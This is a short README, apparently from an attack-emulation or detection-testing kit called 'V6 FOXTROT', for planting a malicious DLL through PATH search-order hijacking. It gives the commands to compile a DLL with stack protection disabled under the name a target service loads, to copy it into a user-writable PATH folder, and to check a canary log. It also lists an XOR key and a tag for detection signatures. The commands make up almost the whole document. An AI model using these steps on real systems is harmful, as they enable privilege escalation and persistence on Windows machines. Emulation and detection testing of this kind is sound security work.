# V6 FOXTROT — PATH DLL Plant

## Build
```cmd
vcvars64.bat
cl.exe path_hijack_dll_annotated.c /Fe:targetname.dll /LD /O1 /GS- /utf-8
```
Replace `targetname` with the DLL name the target service expects.

## Deploy
```cmd
copy targetname.dll "C:\Users\%USERNAME%\.local\bin\"
```

## Verify
```cmd
type C:\Windows\Temp\hwmon_diag.log
```

## Signature Set: FOXTROT
- XOR Key: 0x63
- Canary: `C:\Windows\Temp\hwmon_diag.log`
- Tag: `PATH_VECTOR`
